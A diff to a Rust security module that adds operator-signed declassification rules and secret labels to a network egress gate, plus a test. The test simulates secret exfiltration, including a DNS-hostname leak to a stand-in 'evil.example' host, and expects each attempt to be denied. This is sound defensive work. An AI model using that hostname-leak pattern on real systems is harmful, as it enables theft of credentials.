@@ -30,8 +30,9 @@
 //! Before any subsequent network effect, the gate checks whether the outbound
 //! payload or destination CONTAINS a secret sample, literally, as a direct
 //! hex/base64/base64url encoding, or through a supported decoded byte view;
-//! if so — and absent a valid declassification
-//! (operator-authorized override, not yet wired) — the effect fails closed with
+//! if so — and absent a valid operator-signed declassification rule matching
+//! that exact sink and required label set (`[[security.ifc.declassify]]`) —
+//! the effect fails closed with
 //! [`HostIoError::Denied`] and never reaches the wrapped provider. The engine's
 //! host-I/O transcript records the denial.
 //!
@@ -83,7 +84,12 @@ use frankenengine_extension_host::host_io::{
 };
 
 #[cfg(feature = "engine")]
-use crate::security::lineage_tracker::classify_sensitive_source_path;
+use crate::config::IfcDeclassifyRuleConfig;
+#[cfg(feature = "engine")]
+use crate::security::lineage_tracker::{
+    DeclassificationReceipt, FlowSinkKind, FlowSinkPolicy, SECRET_ENVIRONMENT_LABEL,
+    SECRET_FILE_LABEL, classify_sensitive_source_path,
+};
 
 /// Bounds for containment tracking. Reads outside these bounds are NOT public:
 /// a nonempty untrackable read permanently closes the network gate. Each source
@@ -287,11 +293,17 @@ impl SecretPattern {
 #[cfg(feature = "engine")]
 struct SecretSample {
     patterns: [SecretPattern; 4],
+    labels: BTreeSet<&'static str>,
 }
 
 #[cfg(feature = "engine")]
 impl SecretSample {
+    #[cfg(test)]
     fn new(bytes: &[u8]) -> Self {
+        Self::with_label(bytes, SECRET_FILE_LABEL)
+    }
+
+    fn with_label(bytes: &[u8], label: &'static str) -> Self {
         use base64::engine::general_purpose::{STANDARD_NO_PAD, URL_SAFE_NO_PAD};
         Self {
             patterns: [
@@ -302,6 +314,7 @@ impl SecretSample {
                 SecretPattern::new(STANDARD_NO_PAD.encode(bytes).into_bytes(), false),
                 SecretPattern::new(URL_SAFE_NO_PAD.encode(bytes).into_bytes(), false),
             ],
+            labels: BTreeSet::from([label]),
         }
     }
 
@@ -318,6 +331,193 @@ impl SecretSample {
                 &self.patterns[0].failure,
                 outbound,
             )
+    }
+}
+
+/// Cryptographically verified operator declassification grant for one exact
+/// network sink (`host:port`) and secret label set (`bd-reality-20260923-26n9r.13`).
+#[cfg(feature = "engine")]
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct AuthorizedFlowDeclassification {
+    pub sink_host_port: String,
+    pub labels: BTreeSet<String>,
+    pub actor: String,
+    pub purpose: String,
+    pub issued_at_ms: u64,
+    pub expires_at_ms: u64,
+    pub epoch: u64,
+    pub signer_id: String,
+    pub signature_ref: String,
+}
+
+#[cfg(feature = "engine")]
+impl AuthorizedFlowDeclassification {
+    pub fn from_verified_rule(
+        rule: &IfcDeclassifyRuleConfig,
+        trusted_verifying_key: &ed25519_dalek::VerifyingKey,
+        current_time_ms: u64,
+        epoch: u64,
+    ) -> Result<Self, String> {
+        let sink_host_port =
+            rule.verify_against_verifying_key(trusted_verifying_key, current_time_ms)?;
+        Ok(Self {
+            sink_host_port,
+            labels: rule.labels.clone(),
+            actor: rule.actor.trim().to_string(),
+            purpose: rule.purpose.trim().to_string(),
+            issued_at_ms: rule.issued_at_ms,
+            expires_at_ms: rule.expires_at_ms,
+            epoch,
+            signer_id: format!("ed25519:{}", rule.signer_public_key_hex),
+            signature_ref: format!("ed25519:{}", rule.signature_hex),
+        })
+    }
+
+    fn mint_receipt(
+        &self,
+        required_labels: BTreeSet<String>,
+        now_ms: u64,
+    ) -> Result<DeclassificationReceipt, String> {
+        if now_ms < self.issued_at_ms || now_ms >= self.expires_at_ms {
+            return Err("declassification grant expired before network egress".to_string());
+        }
+        if !required_labels.is_subset(&self.labels) {
+            return Err(
+                "declassification grant does not cover all required secret labels".to_string(),
+            );
+        }
+        let max_revocation_age_ms = self.expires_at_ms.saturating_sub(self.issued_at_ms).max(1);
+        let policy = FlowSinkPolicy {
+            policy_id: format!("ifc-declassify:{}", self.sink_host_port),
+            sink_id: self.sink_host_port.clone(),
+            sink_kind: FlowSinkKind::NetworkEgress,
+            epoch: self.epoch,
+            actor: self.actor.clone(),
+            purpose: self.purpose.clone(),
+            forbidden_labels: required_labels.clone(),
+            deny_all: false,
+            max_revocation_age_ms,
+        };
+        DeclassificationReceipt::scoped(
+            &policy,
+            required_labels,
+            self.issued_at_ms,
+            self.expires_at_ms,
+            now_ms,
+            &self.signer_id,
+            &self.signature_ref,
+        )
+        .map_err(|err| err.to_string())
+    }
+}
+
+#[cfg(feature = "engine")]
+#[derive(Default)]
+struct FlowDeclassificationState {
+    allowed_network_fifo: std::collections::VecDeque<(String, [u8; 32], DeclassificationReceipt)>,
+    emitted_receipts: Vec<DeclassificationReceipt>,
+}
+
+/// Shared tracker linking [`FlowGatedHostIo`] declassification authorizations to
+/// [`HostEffectLedger`](crate::ops::engine_dispatcher::HostEffectLedger) and run receipts.
+#[cfg(feature = "engine")]
+pub struct FlowDeclassificationTracker {
+    grants: Vec<AuthorizedFlowDeclassification>,
+    state: Mutex<FlowDeclassificationState>,
+}
+
+#[cfg(feature = "engine")]
+impl std::fmt::Debug for FlowDeclassificationTracker {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.debug_struct("FlowDeclassificationTracker")
+            .field("grant_count", &self.grants.len())
+            .finish_non_exhaustive()
+    }
+}
+
+#[cfg(feature = "engine")]
+impl FlowDeclassificationTracker {
+    #[must_use]
+    pub fn new(grants: Vec<AuthorizedFlowDeclassification>) -> Self {
+        Self {
+            grants,
+            state: Mutex::new(FlowDeclassificationState::default()),
+        }
+    }
+
+    fn current_unix_ms() -> Result<u64, String> {
+        let millis = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map_err(|err| format!("system clock before UNIX_EPOCH: {err}"))?
+            .as_millis();
+        u64::try_from(millis).map_err(|_| "system clock overflowed u64 ms".to_string())
+    }
+
+    fn payload_digest(payload: &[u8]) -> [u8; 32] {
+        use sha2::{Digest as _, Sha256};
+        Sha256::digest(payload).into()
+    }
+
+    fn authorize_egress(
+        &self,
+        endpoint: &str,
+        required_labels: &BTreeSet<String>,
+    ) -> Option<DeclassificationReceipt> {
+        let normalized_endpoint = IfcDeclassifyRuleConfig::normalize_network_sink(endpoint).ok()?;
+        let now_ms = Self::current_unix_ms().ok()?;
+        for grant in &self.grants {
+            if grant.sink_host_port == normalized_endpoint
+                && now_ms >= grant.issued_at_ms
+                && now_ms < grant.expires_at_ms
+                && required_labels.is_subset(&grant.labels)
+                && let Ok(receipt) = grant.mint_receipt(required_labels.clone(), now_ms)
+            {
+                return Some(receipt);
+            }
+        }
+        None
+    }
+
+    fn record_allowed_egress(
+        &self,
+        endpoint: &str,
+        payload: &[u8],
+        receipt: DeclassificationReceipt,
+    ) {
+        if let Ok(mut state) = self.state.lock() {
+            let digest = Self::payload_digest(payload);
+            state
+                .allowed_network_fifo
+                .push_back((endpoint.to_owned(), digest, receipt.clone()));
+            if !state
+                .emitted_receipts
+                .iter()
+                .any(|existing| existing.receipt_id == receipt.receipt_id)
+            {
+                state.emitted_receipts.push(receipt);
+            }
+        }
+    }
+
+    pub fn take_for_allowed_network_effect(
+        &self,
+        endpoint: &str,
+        payload: &[u8],
+    ) -> Option<DeclassificationReceipt> {
+        let mut state = self.state.lock().ok()?;
+        let digest = Self::payload_digest(payload);
+        let pos = state
+            .allowed_network_fifo
+            .iter()
+            .position(|(ep, dg, _)| ep == endpoint && dg == &digest)?;
+        state.allowed_network_fifo.remove(pos).map(|(_, _, r)| r)
+    }
+
+    pub fn emitted_receipts(&self) -> Vec<DeclassificationReceipt> {
+        match self.state.lock() {
+            Ok(state) => state.emitted_receipts.clone(),
+            Err(poisoned) => poisoned.into_inner().emitted_receipts.clone(),
+        }
     }
 }
 
@@ -355,6 +555,7 @@ pub struct FlowGatedHostIo<P: HostIoProvider> {
     /// effects/observations and network authorization/delegation, so a write into
     /// an open file cannot race a read or a network authorization on this gate.
     lineage: Mutex<FileLineage>,
+    declassifications: Option<Arc<FlowDeclassificationTracker>>,
     trace_id: String,
 }
 
@@ -374,19 +575,34 @@ impl<P: HostIoProvider> std::fmt::Debug for FlowGatedHostIo<P> {
 impl<P: HostIoProvider> FlowGatedHostIo<P> {
     /// Wrap `inner`. `trace_id` labels the gate's denials for correlation.
     pub fn new(inner: P, trace_id: impl Into<String>) -> Self {
+        Self::with_declassifications(inner, trace_id, None)
+    }
+
+    /// Wrap `inner` with optional verified operator sink declassifications.
+    pub fn with_declassifications(
+        inner: P,
+        trace_id: impl Into<String>,
+        declassifications: Option<Arc<FlowDeclassificationTracker>>,
+    ) -> Self {
         Self {
             inner,
             secrets: Mutex::new(SecretSamples::default()),
             descriptors: Mutex::new(BTreeMap::new()),
             lineage: Mutex::new(FileLineage::default()),
+            declassifications,
             trace_id: trace_id.into(),
         }
     }
 
     /// Retain a sensitive read's bytes, or close the network gate if retaining
-    /// them is impossible. Repeated reads of an existing sample cost no budget.
+    /// them is impossible. Repeated reads of an existing sample cost no budget,
+    /// while unioning any newly observed provenance label onto that sample.
     /// A poisoned lock is left poisoned; every subsequent egress will deny.
     fn record_secret(&self, bytes: &[u8]) {
+        self.record_secret_with_label(bytes, SECRET_FILE_LABEL);
+    }
+
+    fn record_secret_with_label(&self, bytes: &[u8], label: &'static str) {
         if bytes.is_empty() {
             return;
         }
@@ -399,17 +615,18 @@ impl<P: HostIoProvider> FlowGatedHostIo<P> {
             }
             // Deduplicate before testing capacity: a full but complete sample
             // set remains complete when a known secret is reread.
-            if secrets
+            if let Some(existing) = secrets
                 .samples
-                .iter()
-                .any(|existing| existing.source_bytes() == bytes)
+                .iter_mut()
+                .find(|existing| existing.source_bytes() == bytes)
             {
+                existing.labels.insert(label);
                 return;
             }
             if secrets.samples.len() >= MAX_SECRET_SAMPLES {
                 secrets.incomplete = true;
             } else {
-                secrets.samples.push(SecretSample::new(bytes));
+                secrets.samples.push(SecretSample::with_label(bytes, label));
             }
         }
     }
@@ -536,11 +753,13 @@ impl<P: HostIoProvider> FlowGatedHostIo<P> {
         outcome
     }
 
-    /// `Ok(())` authorizes the egress; `Err(Denied)` fails it closed when the
-    /// outbound bytes contain a retained secret sample. A poisoned lock denies
-    /// fail-closed. Check tracking completeness even for empty payloads:
-    /// connecting is still a host effect.
-    fn check_outbound(&self, outbound: &[u8], lineage: &FileLineage) -> Result<(), HostIoError> {
+    /// Collects secret source labels carried by `outbound`, failing closed on
+    /// incomplete or poisoned tracking.
+    fn collect_outbound_secret_labels(
+        &self,
+        outbound: &[u8],
+        lineage: &FileLineage,
+    ) -> Result<BTreeSet<String>, HostIoError> {
         if lineage.incomplete {
             return Err(HostIoError::Denied {
                 reason: format!(
@@ -557,29 +776,37 @@ impl<P: HostIoProvider> FlowGatedHostIo<P> {
                 ),
             });
         }
-        let carries_secret = match self.secrets.lock() {
-            Ok(secrets) if secrets.incomplete => {
-                return Err(HostIoError::Denied {
-                    reason: format!(
-                        "flow_policy: incomplete secret tracking; network egress denied ({})",
-                        self.trace_id
-                    ),
-                });
+        match self.secrets.lock() {
+            Ok(secrets) if secrets.incomplete => Err(HostIoError::Denied {
+                reason: format!(
+                    "flow_policy: incomplete secret tracking; network egress denied ({})",
+                    self.trace_id
+                ),
+            }),
+            Ok(secrets) => {
+                let mut labels = BTreeSet::new();
+                for sample in &secrets.samples {
+                    if sample.occurs_in(outbound) {
+                        labels.extend(sample.labels.iter().map(|label| (*label).to_owned()));
+                    }
+                }
+                Ok(labels)
             }
-            Ok(secrets) => secrets
-                .samples
-                .iter()
-                .any(|sample| sample.occurs_in(outbound)),
-            Err(_) => {
-                return Err(HostIoError::Denied {
-                    reason: format!(
-                        "flow_policy: secret sample lock poisoned during egress ({})",
-                        self.trace_id
-                    ),
-                });
-            }
-        };
-        if carries_secret {
+            Err(_) => Err(HostIoError::Denied {
+                reason: format!(
+                    "flow_policy: secret sample lock poisoned during egress ({})",
+                    self.trace_id
+                ),
+            }),
+        }
+    }
+
+    /// `Ok(())` authorizes the egress without declassification; `Err(Denied)`
+    /// fails it closed when the outbound bytes contain a retained secret sample.
+    /// Used for DNS/endpoint strings where declassification is never permitted.
+    fn check_outbound(&self, outbound: &[u8], lineage: &FileLineage) -> Result<(), HostIoError> {
+        let required_labels = self.collect_outbound_secret_labels(outbound, lineage)?;
+        if !required_labels.is_empty() {
             return Err(HostIoError::Denied {
                 reason: format!(
                     "flow_policy: forbidden-labeled (secret-source) bytes reached a network sink without declassification ({})",
@@ -588,6 +815,34 @@ impl<P: HostIoProvider> FlowGatedHostIo<P> {
             });
         }
         Ok(())
+    }
+
+    /// Evaluate outbound payload bytes against `endpoint`, authorizing egress via a
+    /// canonical [`DeclassificationReceipt`] iff an operator-signed rule covers
+    /// `endpoint` and all `required_labels`.
+    fn check_outbound_for_sink(
+        &self,
+        endpoint: &str,
+        payload: &[u8],
+        lineage: &FileLineage,
+    ) -> Result<Option<DeclassificationReceipt>, HostIoError> {
+        let required_labels = self.collect_outbound_secret_labels(payload, lineage)?;
+        if required_labels.is_empty() {
+            return Ok(None);
+        }
+        if let Some(receipt) = self
+            .declassifications
+            .as_ref()
+            .and_then(|tracker| tracker.authorize_egress(endpoint, &required_labels))
+        {
+            return Ok(Some(receipt));
+        }
+        Err(HostIoError::Denied {
+            reason: format!(
+                "flow_policy: forbidden-labeled (secret-source) bytes reached a network sink without declassification ({})",
+                self.trace_id
+            ),
+        })
     }
 
     #[cfg(test)]
@@ -655,14 +910,23 @@ impl<P: HostIoProvider> FlowGatedHostIo<P> {
         })?;
         match request {
             // Check both channels before the effect: a hostname can disclose
-            // secret data during DNS resolution even with an empty payload.
+            // secret data during DNS resolution even with an empty payload, so
+            // endpoint strings are never declassified. Payload bytes may cross
+            // only when an operator-signed rule covers this exact sink + labels.
             HostIoRequest::NetworkSend { endpoint, payload }
             | HostIoRequest::NetworkRequest {
                 endpoint, payload, ..
             } => {
                 self.check_outbound(endpoint.as_bytes(), &lineage)?;
-                self.check_outbound(payload, &lineage)?;
-                dispatch(request, granted)
+                let declassified = self.check_outbound_for_sink(endpoint, payload, &lineage)?;
+                let outcome = dispatch(request, granted);
+                if outcome.is_ok()
+                    && let (Some(tracker), Some(receipt)) =
+                        (self.declassifications.as_ref(), declassified)
+                {
+                    tracker.record_allowed_egress(endpoint, payload, receipt);
+                }
+                outcome
             }
             // Receive opens a new outbound socket too. It has no payload, but
             // its endpoint is still a sink and incomplete tracking must deny.
@@ -673,7 +937,7 @@ impl<P: HostIoProvider> FlowGatedHostIo<P> {
             HostIoRequest::EnvRead { .. } => {
                 let outcome = dispatch(request, granted);
                 if let Ok(HostIoResponse::EnvRead { value: Some(value) }) = &outcome {
-                    self.record_secret(value.as_bytes());
+                    self.record_secret_with_label(value.as_bytes(), SECRET_ENVIRONMENT_LABEL);
                 }
                 outcome
             }
@@ -1658,5 +1922,131 @@ mod tests {
         .expect("short environment source remains readable");
         assert_denied(&gate, b"public payload");
         assert_denied(&gate, b"");
+    }
+
+    #[test]
+    fn operator_signed_declassification_permits_only_matching_sink_and_labels_without_hostname_leak()
+     {
+        let now_ms = FlowDeclassificationTracker::current_unix_ms().expect("clock");
+        let signing_key = ed25519_dalek::SigningKey::from_bytes(&[0x55; 32]);
+        let rule = IfcDeclassifyRuleConfig::sign(
+            "127.0.0.1:8443",
+            BTreeSet::from(["secret_file".to_string()]),
+            "secops@acme.corp",
+            "kms-unwrap",
+            now_ms.saturating_sub(5_000),
+            now_ms.saturating_add(60_000),
+            &signing_key,
+        )
+        .expect("sign rule");
+        let grant = AuthorizedFlowDeclassification::from_verified_rule(
+            &rule,
+            &signing_key.verifying_key(),
+            now_ms,
+            1,
+        )
+        .expect("verify grant");
+        let tracker = Arc::new(FlowDeclassificationTracker::new(vec![grant]));
+        let gate = FlowGatedHostIo::with_declassifications(
+            DenyAllHostIo,
+            "flow-declass-test",
+            Some(Arc::clone(&tracker)),
+        );
+
+        let read_env = HostIoRequest::FsRead {
+            path: ".env".into(),
+        };
+        dispatch_outcome(
+            &gate,
+            &read_env,
+            Ok(HostIoResponse::FsRead {
+                bytes: b"API_SECRET_VALUE_987654".to_vec(),
+            }),
+        )
+        .expect("read .env");
+
+        // 1. Matching sink + secret_file payload succeeds and records canonical DeclassificationReceipt.
+        let allowed_req = HostIoRequest::NetworkRequest {
+            endpoint: "127.0.0.1:8443".into(),
+            payload: b"POST /unwrap\r\n\r\nAPI_SECRET_VALUE_987654".to_vec(),
+            max_len: 4096,
+            use_tls: false,
+        };
+        dispatch_outcome(
+            &gate,
+            &allowed_req,
+            Ok(HostIoResponse::NetworkRequest {
+                response: b"HTTP/1.1 200 OK\r\n\r\n".to_vec(),
+            }),
+        )
+        .expect("authorized sink declassification must allow");
+        assert_eq!(tracker.emitted_receipts().len(), 1);
+        let taken = tracker
+            .take_for_allowed_network_effect(
+                "127.0.0.1:8443",
+                b"POST /unwrap\r\n\r\nAPI_SECRET_VALUE_987654",
+            )
+            .expect("queued declassification receipt");
+        assert_eq!(taken.sink_id, "127.0.0.1:8443");
+
+        // 2. Different sink port fails closed.
+        let wrong_sink_req = HostIoRequest::NetworkRequest {
+            endpoint: "127.0.0.1:9443".into(),
+            payload: b"POST /unwrap\r\n\r\nAPI_SECRET_VALUE_987654".to_vec(),
+            max_len: 4096,
+            use_tls: false,
+        };
+        assert!(matches!(
+            dispatch_outcome(
+                &gate,
+                &wrong_sink_req,
+                Ok(HostIoResponse::NetworkRequest {
+                    response: Vec::new()
+                }),
+            ),
+            Err(HostIoError::Denied { .. })
+        ));
+
+        // 3. Secret inside DNS hostname/endpoint fails closed even if payload is empty.
+        let dns_leak_req = HostIoRequest::NetworkSend {
+            endpoint: "API_SECRET_VALUE_987654.evil.example:443".into(),
+            payload: Vec::new(),
+        };
+        assert!(matches!(
+            dispatch_outcome(
+                &gate,
+                &dns_leak_req,
+                Ok(HostIoResponse::NetworkSend { bytes_sent: 0 }),
+            ),
+            Err(HostIoError::Denied { .. })
+        ));
+
+        // 4. Environment secret requires `secret_environment` label; `secret_file`-only rule denies!
+        dispatch_outcome(
+            &gate,
+            &HostIoRequest::EnvRead {
+                name: "SERVICE_TOKEN".into(),
+            },
+            Ok(HostIoResponse::EnvRead {
+                value: Some("ENV_ONLY_SECRET_55443322".into()),
+            }),
+        )
+        .expect("read env");
+        let env_leak_req = HostIoRequest::NetworkRequest {
+            endpoint: "127.0.0.1:8443".into(),
+            payload: b"ENV_ONLY_SECRET_55443322".to_vec(),
+            max_len: 4096,
+            use_tls: false,
+        };
+        assert!(matches!(
+            dispatch_outcome(
+                &gate,
+                &env_leak_req,
+                Ok(HostIoResponse::NetworkRequest {
+                    response: Vec::new()
+                }),
+            ),
+            Err(HostIoError::Denied { .. })
+        ));
     }
 }
